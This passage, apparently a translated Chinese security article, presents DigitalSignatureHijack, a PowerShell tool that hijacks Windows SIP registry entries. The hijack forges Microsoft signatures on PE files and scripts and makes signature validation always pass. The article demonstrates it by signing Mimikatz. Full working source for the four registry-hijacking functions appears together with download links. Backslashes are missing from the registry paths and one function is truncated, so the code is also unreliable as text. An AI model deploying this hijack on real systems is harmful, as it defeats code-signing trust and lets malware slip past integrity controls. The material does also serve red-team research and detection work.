    HKLMSOFTWAREMicrosoftCryptographyOIDEncodingType 0CryptSIPDllVerifyIndirectData{C689AAB8-8E78-11D0-8C47-00C04FC295EE}
    DLL - C:WindowsSystem32WINTRUST.DLL
    FuncName - CryptSIPVerifyIndirectData
**Powershell自动化过程**
**一般信息**
DigitalSignatureHijack基于PowerShell，可以从具有管理员权限的PowerShell控制台执行。
设计想法是通过只执行四个命令来快速地对PowerShell脚本和PE文件进行数字签名。
**命令**
该脚本接受以下命令：
**SignExe – 给PE文件签名**
**SignPS – 给PowerShell脚本签名**
**ValidateSignaturePE – PE文件的签名验证**
**ValidateSignaturePS – PowerShell脚本的签名验证**
**依赖**
DigitalSignature-Hijack依赖马特·格雷伯开发的自定义SIP（Subject Interface Package）dll文件。
因此，需要将其存储在目标系统的某个位置，并且需要使用该DLL文件的新位置来更新脚本，否则注册表劫持将不起作用。
[](https://github.com/netbiosX/Digital-Signature-Hijack)[编译版本的MySIP.dll](https://github.com/netbiosX/Digital-Signature-Hijack)
[](https://github.com/mattifestation/PoCSubjectInterfacePackage)[MySIP
DLL的源代码](https://github.com/mattifestation/PoCSubjectInterfacePackage)
**演示**
以下是可用于对主机上存在的所有PowerShell脚本和PE文件进行数字签名的命令。
**要签署的二进制文件**
Mimikatz为人们所熟知。它不是Windows的一部分，也不是由微软数字签名的。
SignExe命令将会为Mimikatz提供一个Microsoft证书。
签名验证：
劫持合法证书将产生哈希不匹配错误，导致数字签名将无法通过验证。
执行ValidateSignaturePE命令将准确的验证存储在系统上的所有PE文件的数字签名。
**签名PowerShell脚本**
DigitalSignature-Hijack PowerShell脚本没有签名。 因此，在开启了设备保护UMCI（User Mode Code
Integrity：用户模式代码完整性）的情况下，需要对其进行签名。
执行SignPS命令将为Microsoft PowerShell脚本提供一个Microsoft证书。
签名验证：
与PE文件一样，Microsoft也正在对PowerShell脚本的数字签名进行验证。
执行ValidateSignaturePS命令将绕过验证，因此数字签名将显示为有效。
**下载**
DigitalSignatureHijack脚本可以在以下地址下载：
[](https://gist.github.com/netbiosX/fe5b13b4cc59f9a944fe40944920d07c)[Digital
Signature Hijack Public
Gist](https://gist.github.com/netbiosX/fe5b13b4cc59f9a944fe40944920d07c)
[](https://github.com/netbiosX/Digital-Signature-Hijack)
**源码**
    # Validate Digital Signature for PowerShell Scripts
    function ValidateSignaturePS
    {
            $ValidateHashFunc = 'HKLM:SOFTWAREMicrosoftCryptography' +'OIDEncodingType 0CryptSIPDllVerifyIndirectData'
            # PowerShell SIP Guid
            $PSIPGuid = '{603BCC1F-4B59-4E08-B724-D2C6297EF351}'
            $PSSignatureValidation = Get-Item -Path "$ValidateHashFunc$PSIPGuid"
            $NewDll = 'C:UsersUserDesktopSignature SigningBinariesMySIP.dll'
            $NewFuncName = 'AutoApproveHash'
            $PSSignatureValidation | Set-ItemProperty -Name Dll -Value $NewDll
            $PSSignatureValidation | Set-ItemProperty -Name FuncName -Value $NewFuncName
    }
    # Validate Digital Signature for Portable Executables
    function ValidateSignaturePE
    {
            $ValidateHashFunc = 'HKLM:SOFTWAREMicrosoftCryptography' +'OIDEncodingType 0CryptSIPDllVerifyIndirectData'
            # PE SIP Guid
            $PESIPGuid = '{C689AAB8-8E78-11D0-8C47-00C04FC295EE}'
    $PESignatureValidation = Get-Item -Path "$ValidateHashFunc$PESIPGuid"
            $NewDll = 'C:WindowsSystem32ntdll.dll'
            $NewFuncName = 'DbgUiContinue'
            $PESignatureValidation | Set-ItemProperty -Name Dll -Value $NewDll
            $PESignatureValidation | Set-ItemProperty -Name FuncName -Value $NewFuncName
    }
    # Sign PowerShell Scripts with a Microsoft Certificate
    function SignPS
    {
            $GetCertFunc = 'HKLM:SOFTWAREMicrosoftCryptography' +'OIDEncodingType 0CryptSIPDllGetSignedDataMsg'
            # PowerShell SIP Guid
            $PSIPGuid = '{603BCC1F-4B59-4E08-B724-D2C6297EF351}'
            $PEGetMSCert = Get-Item -Path "$GetCertFunc$PSIPGuid"
            $NewDll = 'C:UsersUserDesktopSignature SigningBinariesMySIP.dll'
            $NewFuncName = 'GetLegitMSSignature'
            $PEGetMSCert | Set-ItemProperty -Name Dll -Value $NewDll
            $PEGetMSCert | Set-ItemProperty -Name FuncName -Value $NewFuncName
    }
    # Sign Portable Executables with a Microsoft Certificate
    function SignExe
    {
            $GetCertFunc = 'HKLM:SOFTWAREMicrosoftCryptography' +'OIDEncodingType 0CryptSIPDllGetSignedDataMsg'
            # PE SIP Guid
            $PESIPGuid = '{C689AAB8-8E78-11D0-8C47-00C04FC295EE}'
            $PEGetMSCert = Get-Item -Path "$GetCertFunc$PESIPGuid"
            $NewDll = 'C:UsersUserDesktopSignature SigningBinariesMySIP.dll'
            $NewFuncName = 'GetLegitMSSignature'
            $PEGetMSCert | Set-ItemProperty -Name Dll -Value $NewDll
            $PEGetMSCert | Set-ItemProperty -Name FuncName -Value $NewFuncName
**参考**
1.
2.[](https://github.com/xorrior/Random-CSharpTools/tree/master/SigPirate)
3.[](https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf)
4.[](https://github.com/minisllc/metatwin)
5.[](https://github.com/mattifestation/PoCSubjectInterfacePackage)
6.[](https://github.com/netbiosX/Digital-Signature-Hijack)
7.[](https://github.com/mstefanowich/FileSignatureHijack)
8.[](http://www.exploit-monday.com/2017/08/application-of-authenticode-signatures.html)
9.[](https://gist.github.com/mattifestation/439720e2379f4bc93f0ed3ce88814b5b)
10.[](https://docs.microsoft.com/en-us/sysinternals/downloads/sigcheck)[](https://docs.microsoft.com/en-us/sysinternals/downloads/sigcheck)